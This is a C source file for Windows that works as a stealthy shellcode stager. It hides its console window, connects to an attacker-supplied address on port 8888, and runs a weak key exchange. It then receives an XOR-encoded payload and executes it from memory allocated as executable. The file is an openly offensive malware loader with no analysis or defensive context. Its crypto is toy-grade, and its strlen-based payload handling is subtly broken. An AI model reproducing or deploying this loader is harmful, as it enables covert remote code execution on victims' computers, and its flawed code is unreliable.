#define IPADDR "IP"
#define PORT 8888

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <math.h>
#include <time.h>

long power(long x, long y, long p)
{
    long res = 1;     // Initialize result
 
    x = x % p; // Update x if it is more than or
                // equal to p
  
    if (x == 0) return 0; // In case x is divisible by p;
 
    while (y > 0)
    {
        // If y is odd, multiply x with result
        if (y & 1)
            res = (res*x) % p;
 
        // y must be even now
        y = y>>1; // y = y/2
        x = (x*x) % p;
    }
    return res;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(stealth, 0);
	
    srand(time(NULL));

    int sock;

    struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;

	ServIP = IPADDR;
	ServPort = PORT;

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

    connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr));

    char buffer[4096];
    memset(buffer, 0, sizeof(buffer));

    int P=251, G=6;
    int a=rand()%(G-2)+2;
    long A=power(G, a, P);
    recv(sock, buffer, 4096, 0);
    int B=atoi(buffer);
    memset(buffer, 0, sizeof(buffer));
    sprintf(buffer, "%d", A);
    send(sock, buffer, 4096, 0);
    long key=power(G, A*B, P);
    
    
    memset(buffer, 0, sizeof(buffer));

    recv(sock, buffer, 4096, 0);

    closesocket(sock);
	WSACleanup();

    const int len=strlen(buffer);
    
    unsigned char buff2[len];

    for(int i=0; i<len; i++){
        buff2[i]=buffer[i]^key;
    }

    void *exec = VirtualAlloc(0, sizeof buff2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buff2, sizeof buff2);
    ((void(*)())exec)();
}
